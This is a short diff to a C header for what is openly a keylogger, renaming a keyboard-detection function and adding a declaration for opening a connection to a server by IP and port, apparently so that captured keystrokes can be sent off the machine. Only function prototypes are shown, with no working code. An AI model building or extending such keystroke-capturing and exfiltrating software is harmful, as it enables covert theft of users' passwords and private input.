@@ -10,8 +10,9 @@ typedef struct input_event event;
 
 void startKeylogger(int keyboard, int server);
 int findKeyboardDevice(char *dir_path);
-int keyboardDevice(char *path);
+int isKeyboardDevice(char *path, int *keyboard_device);
 int writeEventsIntoFile(int fd, event *events, size_t to_write);
 void sigHandler(int signum);
+int openConnectionWithServer(char*ip, short port);
 
 #endif
